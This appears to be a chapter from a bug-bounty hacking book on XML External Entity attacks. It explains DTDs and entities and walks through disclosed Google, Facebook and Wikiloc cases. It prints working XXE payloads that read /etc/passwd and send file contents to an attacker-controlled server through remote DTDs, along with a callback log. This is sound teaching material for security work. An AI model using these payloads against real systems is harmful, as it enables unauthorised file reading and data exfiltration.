<html><head></head><body>
<h2 class="h2" id="ch11"><span epub:type="pagebreak" id="page_107"/><strong><span class="big">11</span><br/>XML EXTERNAL ENTITY</strong></h2>&#13;
<div class="image1"><img alt="Image" src="../images/common.jpg"/></div>&#13;
<p class="noindent">Attackers can exploit how an application parses <em>eXtensible Markup Language (XML)</em> by taking advantage of an <em>XML External Entity (XXE)</em> vulnerability. More specifically, it involves exploiting how the application processes the inclusion of external entities in its input. You can use an XXE to extract information from a server or to call on a malicious server.</p>&#13;
<h3 class="h3" id="ch11lev1sec1"><strong>eXtensible Markup Language</strong></h3>&#13;
<p class="noindent">This vulnerability takes advantage of the external entities used in XML. XML is a <em>metalanguage</em>, meaning it’s used to describe other languages. It was developed as a response to the shortcomings of HTML, which can define only how data is <em>displayed</em>. In contrast, XML defines how data is <em>structured</em>.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_108"/>For example, HTML can format text as a header using the opening header tag <span class="literal">&lt;h1&gt;</span> and a closing tag <span class="literal">&lt;/h1&gt;</span>. (For some tags, the closing tag is optional.) Each tag can have a predefined style that the browser applies to the text on a website when it renders it. For example, the <span class="literal">&lt;h1&gt;</span> tag might format all headers as bold with a 14px font size. Similarly, the <span class="literal">&lt;table&gt;</span> tag presents data in rows and columns, and <span class="literal">&lt;p&gt;</span> tags define how text should look for regular paragraphs.</p>&#13;
<p class="indent">In contrast, XML has no predefined tags. Instead, you define the tags yourself, and those definitions won’t necessarily be included in the XML file. For example, consider the following XML file, which presents a job listing:</p>&#13;
<p class="programs"><span class="ent">➊</span> &lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&#13;
<span class="ent">➋</span> &lt;Jobs&gt;<br/>&#13;
  <span class="ent">➌</span> &lt;Job&gt;<br/>&#13;
    <span class="ent">➍</span> &lt;Title&gt;Hacker&lt;/Title&gt;<br/>&#13;
    <span class="ent">➎</span> &lt;Compensation&gt;1000000&lt;/Compensation&gt;<br/>&#13;
    <span class="ent">➏</span> &lt;Responsibility fundamental="1"&gt;Shot web&lt;/Responsibility&gt;<br/>&#13;
     &lt;/Job&gt;<br/>&#13;
   &lt;/Jobs&gt;</p>&#13;
<p class="indent">All the tags are author defined, so it’s impossible to know from the file alone how this data would look on a web page.</p>&#13;
<p class="indent">The first line <span class="ent">➊</span> is a declaration header indicating the XML 1.0 version and type of Unicode encoding to be used. After the initial header, the <span class="literal">&lt;Jobs&gt;</span> tag <span class="ent">➋</span> wraps all other <span class="literal">&lt;Job&gt;</span> tags <span class="ent">➌</span>. Each <span class="literal">&lt;Job&gt;</span> tag wraps a <span class="literal">&lt;Title&gt;</span> <span class="ent">➍</span>, <span class="literal">&lt;Compensation&gt;</span> <span class="ent">➎</span>, and <span class="literal">&lt;Responsibility&gt;</span> <span class="ent">➏</span> tag. As in HTML, a basic XML tag is made up of two angle brackets surrounding the tag name. But unlike tags in HTML, all XML tags require a closing tag. In addition, each XML tag can have an attribute. For example, the <span class="literal">&lt;Responsibility&gt;</span> tag has the name <span class="literal">Responsibility</span> with an optional attribute made up of the attribute name <span class="literal">fundamental</span> and attribute value <span class="literal">1</span> <span class="ent">➏</span>.</p>&#13;
<h4 class="h4" id="ch11lev2sec1"><strong><em>Document Type Definitions</em></strong></h4>&#13;
<p class="noindent">Because the author can define any tag, a valid XML document must follow a set of general XML rules (these are beyond the scope of this book, but having a closing tag is one example) and match a <em>document type definition (DTD)</em>. An XML DTD is a set of declarations that define which elements exist, what attributes they can have, and which elements can be enclosed within other elements. (An <em>element</em> consists of the opening and closing tags, so an opening <span class="literal">&lt;foo&gt;</span> is a tag and a closing <span class="literal">&lt;/foo&gt;</span> is also a tag, but <span class="literal">&lt;foo&gt;&lt;/foo&gt;</span> is an element.) XML files can either use an external DTD, or they can use an internal DTD that is defined within the XML document.</p>&#13;
<h5 class="h5" id="ch11lev3sec1"><strong>External DTDs</strong></h5>&#13;
<p class="noindent">An external DTD is an external <em>.dtd</em> file the XML document references and fetches. Here’s what an external DTD file might look like for the jobs XML document shown earlier.</p>&#13;
<p class="programs"><span epub:type="pagebreak" id="page_109"/><span class="ent">➊</span> &lt;!ELEMENT Jobs (Job)*&gt;<br/>&#13;
<span class="ent">➋</span> &lt;!ELEMENT Job (Title, Compensation, Responsibility)&gt;<br/>&#13;
   &lt;!ELEMENT Title <span class="ent">➌</span>(#PCDATA)&gt;<br/>&#13;
   &lt;!ELEMENT Compensation (#PCDATA)&gt;<br/>&#13;
   &lt;!ELEMENT Responsibility (#PCDATA)&gt;<br/>&#13;
   &lt;<span class="ent">➍</span>!ATTLIST Responsibility <span class="ent">➎</span>fundamental <span class="ent">➏</span>CDATA <span class="ent">➐</span>"0"&gt;</p>&#13;
<p class="indent">Each element used in the XML document is defined in the DTD file using the keyword <span class="literal">!ELEMENT</span>. The definition of <span class="literal">Jobs</span> indicates that it can contain the element <span class="literal">Job</span>. The asterisk denotes that <span class="literal">Jobs</span> may contain zero or more <span class="literal">Job</span> elements. A <span class="literal">Job</span> element must contain a <span class="literal">Title</span>, <span class="literal">Compensation</span>, and <span class="literal">Responsibility</span> <span class="ent">➋</span>. Each of these is also an element and can contain only HTML-parsable character data, denoted by <span class="literal">(#PCDATA)</span> <span class="ent">➌</span>. The data definition <span class="literal">(#PCDATA)</span> tells the parser what type of characters will be enclosed in each XML tag. Lastly, <span class="literal">Responsibility</span> has an attribute declared using <span class="literal">!ATTLIST</span> <span class="ent">➍</span>. The attribute is named <span class="ent">➎</span>, and the <span class="literal">CDATA</span> <span class="ent">➏</span> tells the parser the tag will only contain character data that shouldn’t be parsed. The default value of <span class="literal">Responsibility</span> is defined as <span class="literal">0</span> <span class="ent">➐</span>.</p>&#13;
<p class="indent">External DTD files are defined in the XML document using the <span class="literal">&lt;!DOCTYPE&gt;</span> element:</p>&#13;
<p class="programs">&lt;!DOCTYPE <span class="ent">➊</span>note <span class="ent">➋</span>SYSTEM <span class="ent">➌</span>"jobs.dtd"&gt;</p>&#13;
<p class="indent">In this case, we define a <span class="literal">&lt;!DOCTYPE&gt;</span> with the XML entity <span class="literal">note</span> <span class="ent">➊</span>. XML entities are explained in the next section. But for now, just know that <span class="literal">SYSTEM</span> <span class="ent">➋</span> is a keyword that tells the XML parser to get the results of the <em>jobs.dtd</em> file <span class="ent">➌</span> and use that wherever <span class="literal">note</span> <span class="ent">➊</span> is subsequently used in the XML.</p>&#13;
<h5 class="h5" id="ch11lev3sec2"><strong>Internal DTDs</strong></h5>&#13;
<p class="noindent">It’s also possible to include the DTD within the XML document. To do so, the first line of the XML must also be a <span class="literal">&lt;!DOCTYPE&gt;</span> element. By using an internal DTD to combine the XML file and DTD, we’d get a document that looks like the following:</p>&#13;
<p class="programs"><span class="ent">➊</span> &lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&#13;
<span class="ent">➋</span> &lt;!DOCTYPE Jobs [<br/>&#13;
     &lt;!ELEMENT Jobs (Job)*&gt;<br/>&#13;
     &lt;!ELEMENT Job (Title, Compensation, Responsibility)&gt;<br/>&#13;
     &lt;!ELEMENT Title (#PCDATA)&gt;<br/>&#13;
     &lt;!ELEMENT Compensation (#PCDATA)&gt;<br/>&#13;
     &lt;!ELEMENT Responsibility (#PCDATA)&gt;<br/>&#13;
     &lt;!ATTLIST Responsibility fundamental CDATA "0"&gt; ]&gt;<br/>&#13;
<span class="ent">➌</span> &lt;Jobs&gt;<br/>&#13;
     &lt;Job&gt;<br/>&#13;
       &lt;Title&gt;Hacker&lt;/Title&gt;<br/>&#13;
       &lt;Compensation&gt;1000000&lt;/Compensation&gt;<br/>&#13;
       &lt;Responsibility fundamental="1"&gt;Shot web&lt;/Responsibility&gt;<br/>&#13;
     &lt;/Job&gt;<br/>&#13;
   &lt;/Jobs&gt;</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_110"/>Here, we have what’s referred to as an <em>internal DTD declaration</em>. Notice that we still begin with a declaration header, indicating our document conforms to XML 1.0 with UTF-8 encoding <span class="ent">➊</span>. Immediately after, we define our <span class="literal">!DOCTYPE</span> for the XML to follow, this time by just writing out the entire DTD instead of a reference to an external file <span class="ent">➋</span>. The rest of the XML document follows the DTD declaration <span class="ent">➌</span>.</p>&#13;
<h4 class="h4" id="ch11lev2sec2"><strong><em>XML Entities</em></strong></h4>&#13;
<p class="noindent">XML documents contain <em>XML entities</em>, which are like placeholders for information. Using our <span class="literal">&lt;Jobs&gt;</span> example again, if we wanted every job to include a link to our website, it would be tedious for us to write the address every time, especially if our URL could change. Instead, we can use an entity, have the parser fetch the URL at the time of parsing, and insert the value into the document. To create one, you declare a placeholder entity name in an <span class="literal">!ENTITY</span> tag along with the information to put in that placeholder. In the XML document, the entity name is prefixed with an ampersand (<span class="literal">&amp;</span>) and ends with a semicolon (<span class="literal">;</span>). When the XML document is accessed, the placeholder name is substituted with the value declared in the tag. Entity names can do more than just replace placeholders with strings: they can also fetch the contents of a website or file using the <span class="literal">SYSTEM</span> tag along with a URL.</p>&#13;
<p class="indent">We can update our XML file to include this:</p>&#13;
<p class="programs">   &lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&#13;
   &lt;!DOCTYPE Jobs [<br/>&#13;
   <span class="codeitalic1">--snip--</span><br/>&#13;
   &lt;!ATTLIST Responsibility fundamental CDATA "0"&gt;<br/>&#13;
<span class="ent">➊</span> &lt;!ELEMENT Website ANY&gt;<br/>&#13;
<span class="ent">➋</span> &lt;!ENTITY url SYSTEM "website.txt"&gt;<br/>&#13;
   ]&gt;<br/>&#13;
   &lt;Jobs&gt;<br/>&#13;
     &lt;Job&gt;<br/>&#13;
       &lt;Title&gt;Hacker&lt;/Title&gt;<br/>&#13;
       &lt;Compensation&gt;1000000&lt;/Compensation&gt;<br/>&#13;
       &lt;Responsibility fundamental="1"&gt;Shot web&lt;/Responsibility&gt;<br/>&#13;
    <span class="ent">➌</span> &lt;Website&gt;&amp;url;&lt;/Website&gt;<br/>&#13;
     &lt;/Job&gt;<br/>&#13;
   &lt;/Jobs&gt;</p>&#13;
<p class="indent">Notice that I’ve added a <span class="literal">Website !ELEMENT</span>, but instead of <span class="literal">(#PCDATA)</span>, I’ve used <span class="literal">ANY</span> <span class="ent">➊</span>. This data definition means the <span class="literal">Website</span> tag can contain any combination of parsable data. I’ve also defined an <span class="literal">!ENTITY</span> with a <span class="literal">SYSTEM</span> attribute, telling the parser to get the contents of the <em>website.txt</em> file wherever the placeholder name <span class="literal">url</span> is inside a <span class="literal">website</span> tag <span class="ent">➋</span>. At <span class="ent">➌</span> I use the <span class="literal">website</span> tag, and the contents of <em>website.txt</em> would be fetched in the place of <span class="literal">&amp;url;</span>. Note the <span class="literal">&amp;</span> in front of the entity name. Whenever you reference an entity in an XML document, you must precede it with <span class="literal">&amp;</span>.</p>&#13;
<h3 class="h3" id="ch11lev1sec2"><span epub:type="pagebreak" id="page_111"/><strong>How XXE Attacks Work</strong></h3>&#13;
<p class="noindent">In an XXE attack, an attacker abuses a target application so that it includes external entities in its XML parsing. In other words, the application expects some XML but isn’t validating what it’s receiving; it just parses anything it gets. For instance, let’s say the job board in the previous example lets you register and upload jobs via XML.</p>&#13;
<p class="indent">The job board might make its DTD file available to you and assume that you’ll submit a file matching the requirements. Instead of having the <span class="literal">!ENTITY</span> retrieve the contents of <span class="literal">"website.txt"</span>, you could have it retrieve the contents of <span class="literal">"/etc/passwd"</span>. The XML would be parsed, and the contents of the server file <em>/etc/passwd</em> would be included in our content. (The <em>/etc/passwd</em> file originally stored all usernames and passwords on a Linux system. Although Linux systems now store passwords in <em>/etc/shadow</em>, it’s still common to read the <em>/etc/passwd</em> file to prove that a vulnerability exists.)</p>&#13;
<p class="indent">You might submit something like this:</p>&#13;
<p class="programs">   &lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&#13;
<span class="ent">➊</span> &lt;!DOCTYPE foo [<br/>&#13;
  <span class="ent">➋</span> &lt;!ELEMENT foo ANY &gt;<br/>&#13;
  <span class="ent">➌</span> &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;<br/>&#13;
   ]<br/>&#13;
   &gt;<br/>&#13;
<span class="ent">➍</span> &lt;foo&gt;&amp;xxe;&lt;/foo&gt;</p>&#13;
<p class="indent">The parser receives this code and recognizes an internal DTD defining a <span class="literal">foo</span> document type <span class="ent">➊</span>. The DTD tells the parser that <span class="literal">foo</span> can include any parsable data <span class="ent">➋</span>; then there’s an entity <span class="literal">xxe</span> that should read my <em>/etc/passwd</em> file (<em>file://</em> denotes a full URI path to the <em>/etc/passwd</em> file) when the document is parsed. The parser should replace <span class="literal">&amp;xxe;</span> elements with those file contents <span class="ent">➌</span>. Then, you finish it off with XML defining a <span class="literal">&lt;foo&gt;</span> tag that contains <span class="literal">&amp;xxe;</span>, which prints my server info <span class="ent">➍</span>. And that, friends, is why XXE is so dangerous.</p>&#13;
<p class="indent">But wait, there’s more. What if the application didn’t print a response and only parsed my content? If the contents of the sensitive file were never returned to me, would the vulnerability still be useful? Well, instead of parsing a local file, you could contact a malicious server like so:</p>&#13;
<p class="programs"> &lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&#13;
 &lt;!DOCTYPE foo [<br/>&#13;
   &lt;!ELEMENT foo ANY &gt;<br/>&#13;
<span class="ent">➊</span> &lt;!ENTITY % xxe SYSTEM "file:///etc/passwd" &gt;<br/>&#13;
<span class="ent">➋</span> &lt;!ENTITY callhome SYSTEM <span class="ent">➌</span>"www.<span class="codeitalic1">malicious</span>.com/?%xxe;"&gt;<br/>&#13;
   ]<br/>&#13;
 &gt;<br/>&#13;
 &lt;foo&gt;&amp;callhome;&lt;/foo&gt;</p>&#13;
<p class="indent">Now when the XML document is parsed, the <span class="literal">callhome</span> entity <span class="ent">➋</span> is replaced by the contents of a call to <em>www.&lt;malicious&gt;.com/?%xxe</em> <span class="ent">➌</span>. But <span class="ent">➌</span> requires that <span class="literal">%xxe</span> be evaluated as defined in <span class="ent">➊</span>. The XML parser reads <span epub:type="pagebreak" id="page_112"/><em>/etc/passwd</em> and appends that as the parameter to the URL <em>www.&lt;malicous&gt;.com/</em>, thereby sending the file contents as a URL parameter <span class="ent">➌</span>. Because you control that server, you would check your log, and sure enough, it would have the contents of <em>/etc/passwd</em>.</p>&#13;
<p class="indent">You might have noticed the use of <span class="literal">%</span> instead of <span class="literal">&amp;</span> in the <span class="literal">callhome</span> URL, <span class="literal">%xxe;</span> <span class="ent">➊</span>. A <span class="literal">%</span> is used when the entity should be evaluated within the DTD definition. A <span class="literal">&amp;</span> is used when the entity is evaluated in the XML document.</p>&#13;
<p class="indent">Sites protect against XXE vulnerabilities by disabling external entities from being parsed. The OWASP XML External Entity Prevention Cheat Sheet (see <em><a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet</a></em>) has instructions on how to do this for a variety of languages.</p>&#13;
<h3 class="h3" id="ch11lev1sec3"><strong>Read Access to Google</strong></h3>&#13;
<p class="hangt"><strong>Difficulty:</strong> Medium</p>&#13;
<p class="hang"><strong>URL:</strong> <em>https://google.com/gadgets/directory?synd=toolbar/</em></p>&#13;
<p class="hang"><strong>Source:</strong> <em><a href="https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/">https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers/</a></em></p>&#13;
<p class="hang"><strong>Date reported:</strong> April 2014</p>&#13;
<p class="hangb"><strong>Bounty paid:</strong> $10,000</p>&#13;
<p class="noindent">This Google read access vulnerability exploited a feature of Google’s Toolbar button gallery that allowed developers to define their own buttons by uploading XML files containing metadata. Developers could search the buttons gallery, and Google would show a description of the button in the search results.</p>&#13;
<p class="indent">According to the Detectify team, when an XML file that referenced an entity to an external file was uploaded to the gallery, Google parsed the file and then rendered the contents in the button search results.</p>&#13;
<p class="indent">As a result, the team used the XXE vulnerability to render the contents of the server’s <em>/etc/passwd</em> file. At a minimum, this demonstrated that malicious users could exploit the XXE vulnerability to read internal files.</p>&#13;
<h4 class="h4" id="ch11lev2sec3"><strong><em>Takeaways</em></strong></h4>&#13;
<p class="noindent">Even big companies can make mistakes. Whenever a site accepts XML, no matter who owns the site, always test for XXE vulnerabilities. Reading an <em>/etc/passwd</em> file is a good way to demonstrate a vulnerability’s impact on companies.</p>&#13;
<h3 class="h3" id="ch11lev1sec4"><strong>Facebook XXE with Microsoft Word</strong></h3>&#13;
<p class="hangt"><strong>Difficulty:</strong> Hard</p>&#13;
<p class="hang"><strong>URL:</strong> <em><a href="https://facebook.com/careers/">https://facebook.com/careers/</a></em></p>&#13;
<p class="hang"><strong>Source:</strong> Attack Secure Blog</p>&#13;
<p class="hang"><span epub:type="pagebreak" id="page_113"/><strong>Date reported:</strong> April 2014</p>&#13;
<p class="hangb"><strong>Bounty paid:</strong> $6,300</p>&#13;
<p class="noindent">This Facebook XXE is a little more challenging than the previous example because it involves remotely calling a server. In late 2013, Facebook patched an XXE vulnerability discovered by Reginaldo Silva. Silva immediately reported the XXE to Facebook and asked for permission to escalate it to a remote code execution (a type of vulnerability covered in <a href="ch12.xhtml#ch12">Chapter 12</a>). He believed a remote code execution was possible because he could read most files on the server and open arbitrary network connections. Facebook investigated and agreed, paying him $30,000.</p>&#13;
<p class="indent">As a result, Mohamed Ramadan challenged himself to hack Facebook in April 2014. He didn’t think another XXE was a possibility until he found Facebook’s careers page, which allowed users to upload <em>.docx</em> files. The <em>.docx</em> file type is just an archive for XML files. Ramadan created a <em>.docx</em> file, opened it with 7-Zip to extract its contents, and inserted the following payload into one of the XML files:</p>&#13;
<p class="programs"> &lt;!DOCTYPE root [<br/>&#13;
<span class="ent">➊</span> &lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;<br/>&#13;
<span class="ent">➋</span> &lt;!ENTITY % dtd SYSTEM "http://197.37.102.90/ext.dtd"&gt;<br/>&#13;
<span class="ent">➌</span> %dtd;<br/>&#13;
<span class="ent">➍</span> %send;<br/>&#13;
 ]&gt;</p>&#13;
<p class="indent">If the target has external entities enabled, the XML parser will evaluate the <span class="literal">%dtd;</span> <span class="ent">➌</span> entity, which makes a remote call to Ramadan’s server <em>http://197.37.102.90/ext.dtd</em> <span class="ent">➋</span>. That call would return the following, which is the contents of the <em>ext.dtd</em> file:</p>&#13;
<p class="programs"><span class="ent">➎</span> &lt;!ENTITY send SYSTEM 'http://197.37.102.90/FACEBOOK-HACKED?%file;'&gt;</p>&#13;
<p class="indent">First, <span class="literal">%dtd;</span> would reference the external <em>ext.dtd</em> file and make the <span class="literal">%send;</span> entity available <span class="ent">➎</span>. Next, the parser would parse <span class="literal">%send;</span> <span class="ent">➍</span>, which would make a remote call to <span class="literal">http://197.37.102.90/FACEBOOK-HACKED?%file;</span> <span class="ent">➎</span>. The <span class="literal">%file;</span> references the <em>/etc/passwd</em> file <span class="ent">➊</span>, so its contents would replace <span class="literal">%file;</span> in the HTTP request <span class="ent">➎</span>.</p>&#13;
<p class="indent">Calling a remote IP to exploit an XXE isn’t always necessary, although it can be useful when sites parse remote DTD files but block access to reading local files. This is similar to a server-side request forgery (SSRF), which was discussed in <a href="ch10.xhtml#ch10">Chapter 10</a>. With an SSRF, if a site blocks access to internal addresses but allows calls to external sites and follows 301 redirects to internal addresses, you can achieve a similar result.</p>&#13;
<p class="indent">Next, Ramadan started a local HTTP server on his server to receive the call and content using Python and SimpleHTTPServer:</p>&#13;
<p class="programs">   Last login: Tue Jul 8 09:11:09 on console<br/>&#13;
<span class="ent">➊</span> Mohamed:~ mohaab007$ sudo python -m SimpleHTTPServer 80<br/>&#13;
<span epub:type="pagebreak" id="page_114"/>   Password:<br/>&#13;
<span class="ent">➋</span> Serving HTTP on 0.0.0.0 port 80...<br/>&#13;
<span class="ent">➌</span> 173.252.71.129 - - [08/Jul/2014 09:21:10] "GET /ext.dtd HTTP/1.0" 200 -<br/>&#13;
   173.252.71.129 - -[08/Jul/2014 09:21:11] "GET /ext.dtd HTTP/1.0" 200 -<br/>&#13;
   173.252.71.129 - - [08/Jul/2014 09:21:11] code 404, message File not found<br/>&#13;
<span class="ent">➍</span> 173.252.71.129 - -[08/Jul/2014 09:21:10] "GET /FACEBOOK-HACKED? HTTP/1.0" 404</p>&#13;
<p class="indent">At <span class="ent">➊</span> is the command to start Python SimpleHTTPServer, which returns the message <span class="literal">"Serving HTTP on 0.0.0.0 port 80..."</span> at <span class="ent">➋</span>. The terminal waits until it receives an HTTP request to the server. At first, Ramadan didn’t receive a response, but he waited until he finally got a remote call at <span class="ent">➌</span> to retrieve the <em>/ext.dtd</em> file. As expected, he then saw the call back to the server <em>/FACEBOOK-HACKED?</em> <span class="ent">➍</span>, but unfortunately without the contents of the <em>/etc/passwd</em> file appended. This meant that either Ramadan couldn’t read local files using the vulnerability or that <em>/etc/passwd</em> didn’t exist.</p>&#13;
<p class="indent">Before I continue with this report, I should add that Ramadan could have submitted a file that didn’t make a remote call to his server and instead could have just attempted to read the local file. But the initial call for the remote DTD file demonstrates an XXE vulnerability if successful, whereas a failed attempt at reading a local file doesn’t. In this case, because Ramadan recorded HTTP calls to his server from Facebook, he could prove Facebook was parsing remote XML entities and that a vulnerability existed even though he couldn’t access <em>/etc/passwd</em>.</p>&#13;
<p class="indent">When Ramadan reported the bug, Facebook replied asking for a proof of concept video because they couldn’t replicate the upload. After Ramadan supplied a video, Facebook then rejected the submission and suggested that a recruiter had clicked a link, which initiated the request to his server. After exchanging a few emails, the Facebook team did some more digging to confirm the vulnerability existed and awarded a bounty. Unlike the initial XXE in 2013, the impact of Ramadan’s XXE couldn’t have been escalated to a remote code execution, so Facebook awarded a smaller bounty.</p>&#13;
<h4 class="h4" id="ch11lev2sec4"><strong><em>Takeaways</em></strong></h4>&#13;
<p class="noindent">There are a couple of takeaways here. XML files come in different shapes and sizes: keep an eye out for sites that accept <em>.docx</em>, <em>.xlsx</em>, <em>.pptx</em>, and other XML file types because there might be custom applications parsing the file’s XML. At first, Facebook thought an employee clicked a malicious link that connected to Ramadan’s server, which wouldn’t be considered an SSRF. But upon further investigation, Facebook confirmed the request was invoked through a different method.</p>&#13;
<p class="indent">As you’ve seen in other examples, sometimes reports are initially rejected. It’s important to have confidence and to continue working with the company you’re reporting to if you’re certain the vulnerability is valid. Don’t shy away from explaining why something might be a vulnerability or more severe than the company’s initial assessment.</p>&#13;
<h3 class="h3" id="ch11lev1sec5"><span epub:type="pagebreak" id="page_115"/><strong>Wikiloc XXE</strong></h3>&#13;
<p class="hangt"><strong>Difficulty:</strong> Hard</p>&#13;
<p class="hang"><strong>URL:</strong> <em><a href="https://wikiloc.com/">https://wikiloc.com/</a></em></p>&#13;
<p class="hang"><strong>Source:</strong> <em><a href="https://www.davidsopas.com/wikiloc-xxe-vulnerability/">https://www.davidsopas.com/wikiloc-xxe-vulnerability/</a></em></p>&#13;
<p class="hang"><strong>Date reported:</strong> October 2015</p>&#13;
<p class="hangb"><strong>Bounty paid:</strong> Swag</p>&#13;
<p class="noindent">Wikiloc is a website for discovering and sharing the best outdoor trails for hiking, cycling, and many other activities. It also lets users upload their own tracks via XML files, which turns out to be very enticing for cyclist hackers like David Sopas.</p>&#13;
<p class="indent">Sopas registered for Wikiloc and, after noticing the XML upload, decided to test it for an XXE vulnerability. To start, he downloaded a file from the site to determine Wikiloc’s XML structure, which in this case was a <em>.gpx</em> file. He then modified the file and uploaded it. This is the file with his modifications:</p>&#13;
<p class="programs">   {linenos=on}<br/>&#13;
<span class="ent">➊</span> &lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "http://www.davidsopas.com/XXE" &gt; ]&gt;<br/>&#13;
   &lt;gpx<br/>&#13;
    version="1.0"<br/>&#13;
    creator="GPSBabel - http://www.gpsbabel.org"<br/>&#13;
    <br/>&#13;
    <br/>&#13;
    xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix<br/>&#13;
   .com/GPX/1/1/gpx.xsd"&gt;<br/>&#13;
   &lt;time&gt;2015-10-29T12:53:09Z&lt;/time&gt;<br/>&#13;
   &lt;bounds minlat="40.734267000" minlon="-8.265529000" maxlat="40.881475000"<br/>&#13;
   maxlon="-8.037170000"/&gt;<br/>&#13;
   &lt;trk&gt;<br/>&#13;
<span class="ent">➋</span> &lt;name&gt;&amp;xxe;&lt;/name&gt;<br/>&#13;
   &lt;trkseg&gt;<br/>&#13;
   &lt;trkpt lat="40.737758000" lon="-8.093361000"&gt;<br/>&#13;
    &lt;ele&gt;178.000000&lt;/ele&gt;<br/>&#13;
    &lt;time&gt;2009-01-10T14:18:10Z&lt;/time&gt;<br/>&#13;
   --<span class="codeitalic1">snip</span>--</p>&#13;
<p class="indent">At <span class="ent">➊</span>, he added an external entity definition as the first line of the file. At <span class="ent">➋</span>, he called the entity from within the track name in the <em>.gpx</em> file.</p>&#13;
<p class="indent">Uploading the file back to Wikiloc resulted in an <span class="literal">HTTP GET</span> request to Sopas’s server. This is notable for two reasons. First, by using a simple proof of concept call, Sopas was able to confirm that the server was evaluating his injected XML and the server would make external calls. Second, Sopas used the existing XML document so his content fit within the structure the site was expecting.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_116"/>After Sopas had confirmed that Wikiloc would make external HTTP requests, the only other question was whether it would read local files. So, he modified his injected XML to have Wikiloc send him its <em>/etc/issue</em> file contents (the <em>/etc/issue</em> file will will return the operating system used):</p>&#13;
<p class="programs">   &lt;!DOCTYPE roottag [<br/>&#13;
<span class="ent">➊</span> &lt;!ENTITY % file SYSTEM "file:///etc/issue"&gt;<br/>&#13;
<span class="ent">➋</span> &lt;!ENTITY % dtd SYSTEM "http://www.davidsopas.com/poc/xxe.dtd"&gt;<br/>&#13;
<span class="ent">➌</span> %dtd;]&gt;<br/>&#13;
   &lt;gpx<br/>&#13;
    version="1.0"<br/>&#13;
    creator="GPSBabel - http://www.gpsbabel.org"<br/>&#13;
    <br/>&#13;
    <br/>&#13;
    xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix<br/>&#13;
   .com/GPX/1/1/gpx.xsd"&gt;<br/>&#13;
   &lt;time&gt;2015-10-29T12:53:09Z&lt;/time&gt;<br/>&#13;
   &lt;bounds minlat="40.734267000" minlon="-8.265529000" maxlat="40.881475000"<br/>&#13;
   maxlon="-8.037170000"/&gt;<br/>&#13;
   &lt;trk&gt;<br/>&#13;
<span class="ent">➍</span> &lt;name&gt;&amp;send;&lt;/name&gt;<br/>&#13;
   --<span class="codeitalic1">snip</span>--</p>&#13;
<p class="indent">This code should look familiar. Here he has used two entities at <span class="ent">➊</span> and <span class="ent">➋</span>, which are defined using <span class="literal">%</span> because they’ll be evaluated in the DTD. At <span class="ent">➌</span>, he retrieves the <em>xxe.dtd</em> file. The reference to <span class="literal">&amp;send;</span> <span class="ent">➍</span> in the tag gets defined by the returned <em>xxe.dtd</em> file he serves back to Wikiloc from the remote call to his server <span class="ent">➋</span>. Here’s the <em>xxe.dtd</em> file:</p>&#13;
<p class="programs">   &lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&#13;
<span class="ent">➎</span> &lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://www.davidsopas.com/XXE?%file;'&gt;"&gt;<br/>&#13;
   <span class="ent">➏</span> %all;</p>&#13;
<p class="indent">The <span class="literal">% all</span> <span class="ent">➎</span> defines the entity <span class="literal">send</span> at <span class="ent">➍</span>. Sopas’s execution is similar to Ramadan’s approach to Facebook but with a subtle difference: Sopas attempted to ensure that all places the XXE could be executed were included. That is why he calls <span class="literal">%dtd;</span> <span class="ent">➌</span> right after defining it in the internal DTD and <span class="literal">%all;</span> <span class="ent">➏</span> immediately after defining it in the external DTD. The executed code is on the backend of the site, so you likely won’t know exactly how the vulnerability was executed. But here’s what the parsing process could have looked like:</p>&#13;
<ol>&#13;
<li class="noindent">Wikiloc parses the XML and evaluates <span class="literal">%dtd;</span> as an external call to Sopas’s server. Then Wikiloc requests the <em>xxe.dtd</em> file on Sopas’s server.</li>&#13;
<li class="noindent">Sopas’s server returns the <em>xxe.dtd</em> file to Wikiloc.</li>&#13;
<li class="noindent">Wikiloc parses the received DTD file, which triggers the call to <span class="literal">%all</span>.</li>&#13;
<li class="noindent">When <span class="literal">%all</span> is evaluated, it defines <span class="literal">&amp;send;</span>, which includes a call on the entity <span class="literal">%file</span>.</li>&#13;
<li class="noindent"><span epub:type="pagebreak" id="page_117"/>The <span class="literal">%file;</span> call in the URL value is replaced with the contents of the <em>/etc/issue</em> file.</li>&#13;
<li class="noindent">Wikiloc parses the XML document. This parses the <span class="literal">&amp;send;</span> entity, which evaluates to a remote call to Sopas’s server with the contents of the <em>/etc/issue</em> file as a parameter in the URL.</li>&#13;
</ol>&#13;
<p class="indent">In his own words, game over.</p>&#13;
<h4 class="h4" id="ch11lev2sec5"><strong><em>Takeaways</em></strong></h4>&#13;
<p class="noindent">This is a great example of how you can use a site’s XML templates to embed your own XML entities so the file is parsed by the target. In this case, Wikiloc was expecting a <em>.gpx</em> file and Sopas kept that structure, inserting his own XML entities within expected tags. Additionally, it’s interesting to see how you can serve a malicious DTD file back to have a target make <span class="literal">GET</span> requests to your server with file contents as URL parameters. This is an easy way to facilitate data extraction because the <span class="literal">GET</span> parameters will be logged on your server.</p>&#13;
<h3 class="h3" id="ch11lev1sec6"><strong>Summary</strong></h3>&#13;
<p class="noindent">An XXE represents an attack vector with huge potential. You can accomplish an XXE attack in a few ways: getting a vulnerable application to print its <em>/etc/passwd</em> file, calling to a remote server using the <em>/etc/passwd</em> file’s contents, and calling for a remote DTD file that instructs the parser to callback to a server with the <em>/etc/passwd</em> file.</p>&#13;
